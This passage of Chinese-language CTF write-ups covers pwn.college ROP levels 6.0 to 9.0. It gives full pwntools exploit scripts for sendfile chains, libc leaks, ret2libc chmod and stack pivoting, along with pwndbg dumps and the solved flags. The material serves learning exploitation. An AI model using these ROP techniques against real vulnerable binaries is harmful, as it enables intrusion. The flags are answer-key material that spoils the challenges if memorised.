            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Uer5U7c794jENBtWtFCgDEyLRsm.0FM1MDL5cTNxgzW}`

# Level 6.0

## Information

- Category: Pwn

## Description

> Craft a ROP chain to obtain the flag, now with no syscall gadget!

## Write-up

没有 `syscall` gadget 了，但是瞧瞧我发现了什么？

```c
ssize_t __fastcall force_import(const char *a1, int a2)
{
  off_t *v2; // rdx
  size_t v3; // rcx

  open(a1, a2);
  return sendfile((int)a1, a2, v2, v3);
}
```

一次传参直接调用 `force_import` 肯定是不太方便的，但是既然内部有 `open` 和 `sendfile`，那为何不分别调用它们呢？easy peasy!

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level6.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+288
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x58, b"A")

    # args for open
    filename = next(elf.search(b"GNU"))
    flags = constants.O_RDONLY

    # args for sendfile
    out_fd = 0x1
    in_fd = 0x3
    offset = 0x0
    count = 0x1000

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rdx_ret = rop.rdx.address
    pop_rcx_ret = rop.rcx.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        flags,
        elf.symbols["open"],
        pop_rdi_ret,
        out_fd,
        pop_rsi_ret,
        in_fd,
        pop_rdx_ret,
        offset,
        pop_rcx_ret,
        count,
        elf.symbols["sendfile"],
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{0u8eS8EM1OTTXbPHdwgRj2FQ4m0.0VM1MDL5cTNxgzW}`

# Level 6.1

## Information

- Category: Pwn

## Description

> Craft a ROP chain to obtain the flag, now with no syscall gadget!

## Write-up

参见 [Level 6.0](#level-60)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    constants,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level6.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    rop = ROP(elf)

    padding_to_ret = b"".ljust(0x28, b"A")

    # args for open
    filename = next(elf.search(b"GNU"))
    flags = constants.O_RDONLY

    # args for sendfile
    out_fd = 0x1
    in_fd = 0x3
    offset = 0x0
    count = 0x1000

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address
    pop_rdx_ret = rop.rdx.address
    pop_rcx_ret = rop.rcx.address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        flags,
        elf.symbols["open"],
        pop_rdi_ret,
        out_fd,
        pop_rsi_ret,
        in_fd,
        pop_rdx_ret,
        offset,
        pop_rcx_ret,
        count,
        elf.symbols["sendfile"],
    )

    return payload


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload()

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{A-DtWrNucuvlqiQOl-yB1ARFcxt.0lM1MDL5cTNxgzW}`

# Level 7.0

## Information

- Category: Pwn

## Description

> Utilize a libc leak to ROP with libc!

## Write-up

利用已经泄漏的 `system` 的地址减去 `system` 在 `libc` 中的偏移得到 `libc` 的基地址，然后通过 `libc` 基地址加上 `chmod` 在 `libc` 中的偏移就可以得到 `chmod` 的实际地址了。简简单单，都不需要想办法怎么泄漏地址，程序直接通过 `dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "system");` 把地址告诉我们了……

另外，为了防止有人不知道怎么获取当前程序使用的 `libc`，这里简单贴一下：

```plaintext wrap=false showLineNumbers=false
hacker@return-oriented-programming~level7-0:~$ ldd /challenge/babyrop_level7.0
        linux-vdso.so.1 (0x00007ffd75fe8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000745ac0578000)
        /lib64/ld-linux-x86-64.so.2 (0x0000745ac077b000)
```

嗯……如果你不知道我讲的是什么，建议去补习一下 PLT 延迟绑定。推荐看**_《程序员的自我修养——链接、装载与库》_**，**_CSAPP_** 也可以看看，反正底层知识有空一定要多学学，非常重要。

哎不对，难道说 [Level 4](#level-40)……

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level7.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+380
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    padding_to_ret = b"".ljust(0x58, b"A")

    libc.address = leaked_addr - libc.symbols["system"]

    filename = next(elf.search(b"GNU"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_pop_r15_ret,
        mode,
        b"".ljust(0x8, b"A"),
        libc.symbols["chmod"],
    )

    return payload


def leak(target):
    target.recvuntil(b'"system" in libc is: ')

    return int(target.recv(14), 16)


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(leak(target))

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{USImSejN9YmHN5CcyKDwtVScMO7.01M1MDL5cTNxgzW}`

# Level 7.1

## Information

- Category: Pwn

## Description

> Utilize a libc leak to ROP with libc!

## Write-up

参见 [Level 7.0](#level-70)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level7.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    padding_to_ret = b"".ljust(0x48, b"A")

    libc.address = leaked_addr - libc.symbols["system"]

    filename = next(elf.search(b"GNU"))
    mode = 0o4

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    payload = padding_to_ret
    payload += flat(
        pop_rdi_ret,
        filename,
        pop_rsi_pop_r15_ret,
        mode,
        b"".ljust(0x8, b"A"),
        libc.symbols["chmod"],
    )

    return payload


def leak(target):
    target.recvuntil(b'"system" in libc is: ')

    return int(target.recv(14), 16)


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(leak(target))

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{g7Ura4DbaSnnNgm8JQPQ2XM6c_l.0FN1MDL5cTNxgzW}`

# Level 8.0

## Information

- Category: Pwn

## Description

> ROP with libc, no free leak this time!

## Write-up

这次没有 [Level 7](#level-70) 那么愚蠢的泄漏了，需要我们自己想办法获取 `libc` 基地址。

不过思路很简单，我们先获取 `elf.got["puts"]` 在全局偏移表中的地址，然后通过 `puts` 函数泄漏这个地址指向的 `puts` 在 `libc` 中的实际地址。之后用它减去 `libc.symbols["puts"]` 就得到了 `libc` 基地址。程序也随之结束了，不过我们可以再次返回到 `_start` 重启整个程序，利用我们得到的基地址计算出 `chmod` 的实际地址，然后调用它。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level8.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+384
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(stage, leaked_addr=None):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    padding_to_ret = b"".ljust(0x38, b"A")

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    payload = padding_to_ret

    if stage == 1:
        payload += flat(
            pop_rdi_ret,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["_start"],
        )

        return payload
    elif stage == 2:
        libc.address = leaked_addr - libc.symbols["puts"]

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        payload += flat(
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )

        return payload
    else:
        log.error("Incorrect stage number!")


def leak(target):
    target.recvuntil(b"Leaving!\x0a")

    return int.from_bytes(target.recv(0x6), "little")


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        payload = construct_payload(2, leak(target))

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(1)

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{oFCQDFxRqfNOwKX3jCEn79BN5cC.0VN1MDL5cTNxgzW}`

# Level 8.1

## Information

- Category: Pwn

## Description

> ROP with libc, no free leak this time!

## Write-up

参见 [Level 8.0](#level-80)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level8.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(stage, leaked_addr=None):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    padding_to_ret = b"".ljust(0x78, b"A")

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    payload = padding_to_ret

    if stage == 1:
        payload += flat(
            pop_rdi_ret,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["_start"],
        )

        return payload
    elif stage == 2:
        libc.address = leaked_addr - libc.symbols["puts"]

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        payload += flat(
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )

        return payload
    else:
        log.error("Incorrect stage number!")


def leak(target):
    target.recvuntil(b"Leaving!\x0a")

    return int.from_bytes(target.recv(0x6), "little")


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        payload = construct_payload(2, leak(target))

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(1)

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Q0NC7L0dteUeHqynz_c9HjT-w2R.0lN1MDL5cTNxgzW}`

# Level 9.0

## Information

- Category: Pwn

## Description

> Perform a stack pivot to gain control flow!

## Write-up

这题得用栈迁移 (Stack pivot)，不错，新技巧++。

```c del={32, 38} collapse={1-28, 42-43}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-40h] BYREF
  int v5; // [rsp+1Ch] [rbp-24h]
  __int64 *v6; // [rsp+30h] [rbp-10h]
  int v7; // [rsp+3Ch] [rbp-4h]
  __int64 savedregs; // [rsp+40h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+48h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("This challenge doesn't give you much to work with, so you will have to be resourceful.");
  puts("What you'd really like to know is the address of libc.");
  puts("In order to get the address of libc, you'll have to leak it yourself.");
  puts("An easy way to do this is to do what is known as a `puts(puts)`.");
  puts("The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.");
  puts("The inner `puts` is puts@got: this contains the address of puts in libc.");
  puts("Then you will need to continue executing a new ROP chain with addresses based on that leak.");
  puts("One easy way to do that is to just restart the binary by returning to its entrypoint.");
  puts("Previous challenges let you write your ROP chain directly onto the stack.");
  puts("This challenge is not so nice!");
  puts("Your input will be read to the .bss, and only a small part of it will be copied to the stack.");
  puts("You will need to figure out how to use stack pivoting to execute your full ropchain!");
  v7 = read(0, &unk_4150E0, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, v7 / 8);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(&unk_4150E0, (unsigned int)(v7 / 8));
  v6 = &savedregs;
  memcpy(&retaddr, &unk_4150E0, 0x18uLL);
  printf("Of course, only %d bytes of the above ropchain was copied to the stack!\n", 24);
  puts("Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!");
  print_chain(rp_, 3LL);
  return puts("Leaving!");
}
```

直接看调试吧：

```asm wrap=false showLineNumbers=false collapse={2-20, 31-56} ins="dest: 0x7fffc71bc828" ins="rip at 0x7fffc71bc828"
Breakpoint 1, 0x000000000040266c in challenge ()
------- tip of the day (disable with set show-tips off) -------
Use track-got enable|info|query to track GOT accesses - useful for hijacking control flow via writable GOT/PLT
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffc71bc828 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
 RBX  0x7fffc71bc978 —▸ 0x7fffc71bd635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7ebc87f1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x18
 RDI  0x7fffc71bc828 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
 RSI  0x4150e0 (data+65536) —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
 R8   0x17bdf010 ◂— 0
 R9   7
 R10  0x17bdf780 ◂— 0x17bc8d1f
 R11  0x202
 R12  1
 R13  0
 R14  0x7ebc888ab000 (_rtld_global) —▸ 0x7ebc888ac2e0 ◂— 0
 R15  0
 RBP  0x7fffc71bc820 —▸ 0x7fffc71bc850 —▸ 0x7fffc71bc8f0 —▸ 0x7fffc71bc950 ◂— 0
 RSP  0x7fffc71bc7e0 —▸ 0x7fffc71bc820 —▸ 0x7fffc71bc850 —▸ 0x7fffc71bc8f0 —▸ 0x7fffc71bc950 ◂— ...
 RIP  0x40266c (challenge+409) ◂— call 0x401170
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x40266c <challenge+409>    call   memcpy@plt                  <memcpy@plt>
        dest: 0x7fffc71bc828 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
        src: 0x4150e0 (data+65536) —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
        n: 0x18

   0x402671 <challenge+414>    mov    esi, 0x18               ESI => 0x18
   0x402676 <challenge+419>    lea    rdi, [rip + 0x108b]     RDI => 0x403708 ◂— 'Of course, only %d bytes of the above ropchain was...'
   0x40267d <challenge+426>    mov    eax, 0                  EAX => 0
   0x402682 <challenge+431>    call   printf@plt                  <printf@plt>

   0x402687 <challenge+436>    lea    rdi, [rip + 0x10ca]     RDI => 0x403758 ◂— "Let's take a look at just that part of the chain. ..."
   0x40268e <challenge+443>    call   puts@plt                    <puts@plt>

   0x402693 <challenge+448>    mov    rax, qword ptr [rip + 0x13a4e]     RAX, [rp_]
   0x40269a <challenge+455>    mov    esi, 3                             ESI => 3
   0x40269f <challenge+460>    mov    rdi, rax
   0x4026a2 <challenge+463>    call   print_chain                 <print_chain>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffc71bc7e0 —▸ 0x7fffc71bc820 —▸ 0x7fffc71bc850 —▸ 0x7fffc71bc8f0 —▸ 0x7fffc71bc950 ◂— ...
01:0008│-038 0x7fffc71bc7e8 —▸ 0x7fffc71bc988 —▸ 0x7fffc71bd66a ◂— 'MOTD_SHOWN=pam'
02:0010│-030 0x7fffc71bc7f0 —▸ 0x7fffc71bc978 —▸ 0x7fffc71bd635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
03:0018│-028 0x7fffc71bc7f8 ◂— 0x1c71bc978
04:0020│-020 0x7fffc71bc800 —▸ 0x7fffc71bc978 —▸ 0x7fffc71bd635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
05:0028│-018 0x7fffc71bc808 ◂— 1
06:0030│-010 0x7fffc71bc810 —▸ 0x7fffc71bc820 —▸ 0x7fffc71bc850 —▸ 0x7fffc71bc8f0 —▸ 0x7fffc71bc950 ◂— ...
07:0038│-008 0x7fffc71bc818 ◂— 0x38888ab000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40266c challenge+409
   1         0x40275b main+165
   2   0x7ebc87e34e08
   3   0x7ebc87e34ecc __libc_start_main+140
   4         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffc71bc830:
 rip = 0x40266c in challenge; saved rip = 0x40275b
 called by frame at 0x7fffc71bc860
 Arglist at 0x7fffc71bc820, args:
 Locals at 0x7fffc71bc820, Previous frame's sp is 0x7fffc71bc830
 Saved registers:
  rbp at 0x7fffc71bc820, rip at 0x7fffc71bc828
pwndbg> p/d 0x18
$1 = 24
```

在执行 `memcpy` 之前有一个 `read`，可以读取 `0x1000` bytes 输入到数据段 `0x4150e0 (data+65536)`。

虽然大小足够大，但因为是读到数据段，所以我们不能通过 `read` 覆盖返回地址，那么很显然，问题就出这个 `memcpy` 上了。我们注意到它把数据从 `0x4150e0 (data+65536)` 复制到 `0x7fffc71bc828`，注意到这个地址正是我们的返回地址，但是它又限制了我们只能复制 `0x18` bytes，也就是三条指令到 `0x7fffc71bc828`，故我们要是想直接把完整的 payload 通过一次 `memcpy` 执行完是不可能的。如此限制，有何破解之法？当然是栈迁移！通过栈迁移我们可以得到一个更大的空间来发挥，而不用受限于这小小的 `0x18` bytes 的空间。

简单来讲一下栈迁移原理。我们知道 `leave` 指令实际上做的是：

```asm
mov rsp, rbp
pop rbp
```

那我们只要控制 `rbp` 指向我们想到的新的栈的地址，就实现了栈迁移，之后所有 gadgets 的操作都基于新的栈。至于后面那条 `pop rbp` 倒是无所谓，我们重点关注的是 `rsp` 的地址，因为一系列 gadgets 都是通过 `ret` 连接的，`ret` 做的就是 `pop rip`，这都有关于 `rsp`。

当然，可以实现栈迁移的方法不止 `leave; ret` 一种，能改变 `rsp` 的都可以想办法用来做栈迁移，这个自己悟去吧。

那么现在的问题是，迁移到哪里？首先肯定得是 `rw` 区吧，不然怎么实现 ROP。一个比较常见的方法应该是迁移到 `.bss` 段。pwntools 还是很方便的，通过 `elf.bss()` 即可得到当前程序的 `.bss` 段地址。

```asm wrap=false showLineNumbers=false collapse={2-20, 31-56, 63-278, 286-298}
Breakpoint 1, 0x000000000040266c in challenge ()
------- tip of the day (disable with set show-tips off) -------
Want to display each context panel in a separate tmux window? See https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fff4c2cfca8 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x18
 RDI  0x7fff4c2cfca8 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
 RSI  0x4150e0 (data+65536) —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
 R8   0x27643010 ◂— 0
 R9   7
 R10  0x27643780 ◂— 0x27664083
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
 RBP  0x7fff4c2cfca0 —▸ 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
 RSP  0x7fff4c2cfc60 —▸ 0x7fff4c2cfca0 —▸ 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— ...
 RIP  0x40266c (challenge+409) ◂— call 0x401170
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x40266c <challenge+409>    call   memcpy@plt                  <memcpy@plt>
        dest: 0x7fff4c2cfca8 —▸ 0x40275b (main+165) ◂— lea rdi, [rip + 0x107e]
        src: 0x4150e0 (data+65536) —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
        n: 0x18

   0x402671 <challenge+414>    mov    esi, 0x18               ESI => 0x18
   0x402676 <challenge+419>    lea    rdi, [rip + 0x108b]     RDI => 0x403708 ◂— 'Of course, only %d bytes of the above ropchain was...'
   0x40267d <challenge+426>    mov    eax, 0                  EAX => 0
   0x402682 <challenge+431>    call   printf@plt                  <printf@plt>

   0x402687 <challenge+436>    lea    rdi, [rip + 0x10ca]     RDI => 0x403758 ◂— "Let's take a look at just that part of the chain. ..."
   0x40268e <challenge+443>    call   puts@plt                    <puts@plt>

   0x402693 <challenge+448>    mov    rax, qword ptr [rip + 0x13a4e]     RAX, [rp_]
   0x40269a <challenge+455>    mov    esi, 3                             ESI => 3
   0x40269f <challenge+460>    mov    rdi, rax
   0x4026a2 <challenge+463>    call   print_chain                 <print_chain>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff4c2cfc60 —▸ 0x7fff4c2cfca0 —▸ 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— ...
01:0008│-038 0x7fff4c2cfc68 —▸ 0x7fff4c2cfe08 —▸ 0x7fff4c2d066a ◂— 'MOTD_SHOWN=pam'
02:0010│-030 0x7fff4c2cfc70 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
03:0018│-028 0x7fff4c2cfc78 ◂— 0x14c2cfdf8
04:0020│-020 0x7fff4c2cfc80 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
05:0028│-018 0x7fff4c2cfc88 ◂— 1
06:0030│-010 0x7fff4c2cfc90 —▸ 0x7fff4c2cfca0 —▸ 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— ...
07:0038│-008 0x7fff4c2cfc98 ◂— 0x38a4fd4000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40266c challenge+409
   1         0x40275b main+165
   2   0x7d78a4634e08
   3   0x7d78a4634ecc __libc_start_main+140
   4         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p/x $rsi
$1 = 0x4150e0
pwndbg> c
Continuing.

Breakpoint 2, 0x00000000004026b5 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  9
